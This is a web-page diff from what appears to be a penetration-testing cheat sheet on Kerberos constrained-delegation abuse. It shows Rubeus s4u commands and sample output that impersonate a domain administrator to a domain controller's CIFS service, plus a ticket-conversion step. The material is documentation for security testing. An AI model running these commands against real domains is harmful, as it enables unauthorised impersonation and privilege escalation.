@@ -195,7 +195,7 @@ TO-DO</div></pre></div><h4 id="2-get-a-service-ticket">2. Get a Service Ticket</
 </span></span></span></div></pre></div><h4 id="3-convert-ticket-optional">3. Convert Ticket [Optional]</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py '<span class="o editable-keyword">&lt;BASE64_TICKET&gt;</span>' '<span class="o editable-keyword">&lt;IMPERSONATE_USER&gt;</span>.kirbi' '<span class="o editable-keyword">&lt;IMPERSONATE_USER&gt;</span>.ccache'
 </span></span></span></code><div class="output-bubble">Sample Output:
-<span class="line"><span class="cl"><span class="go">python3 ~/Tools/RubeusToCcache/rubeustoccache.py 'doIG9DCCBv ...[SNIP]... 9yZS5jb20=' 'administrator.kirbi' 'administrator.ccache'
+<span class="line"><span class="cl"><span class="go">python3 ~/Tools/RubeusToCcache/rubeustoccache.py 'doIG9DCCBv ---[SNIP]--- 9yZS5jb20=' 'administrator.kirbi' 'administrator.ccache'
 </span></span></span><span class="line"><span class="cl"><span class="go">╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
 </span></span></span><span class="line"><span class="cl"><span class="go">╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
 </span></span></span><span class="line"><span class="cl"><span class="go">╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
@@ -271,7 +271,7 @@ TO-DO</div></pre></div><h4 id="3-get-a-service-ticket">3. Get a Service Ticket</
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFljCCBZKg ...[SNIP]... hPUkUuQ09N
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFljCCBZKg ---[SNIP]--- hPUkUuQ09N
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
@@ -282,7 +282,7 @@ TO-DO</div></pre></div><h4 id="3-get-a-service-ticket">3. Get a Service Ticket</
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Got a TGS for 'administrator' to 'MS01$@CLIENT.EXAMPLE.COM'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGGjCCBh ...[SNIP]... cbBU1TMDIk
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGGjCCBh ---[SNIP]--- cbBU1TMDIk
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.client.example.com'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Building S4U2proxy request for service: 'cifs/dc01.client.example.com'
@@ -291,7 +291,7 @@ TO-DO</div></pre></div><h4 id="3-get-a-service-ticket">3. Get a Service Ticket</
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2proxy success!
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi) for SPN 'cifs/dc01.client.example.com':
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIG9DCCBv ...[SNIP]... 9yZS5jb20=
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIG9DCCBv ---[SNIP]--- 9yZS5jb20=
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
 </span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or Create a sacrificial process
 </span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:'<span class="o editable-keyword">&lt;USER&gt;</span>' /aes256:<span class="o editable-keyword">&lt;HASH&gt;</span> /impersonateuser:'<span class="o editable-keyword">&lt;IMPERSONATE_USER&gt;</span>' /domain:<span class="o editable-keyword">&lt;DOMAIN&gt;</span> /msdsspn:'<span class="o editable-keyword">&lt;SERVICE&gt;</span>/<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>' /altservice:<span class="o editable-keyword">&lt;ALT_SERVICE&gt;</span> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
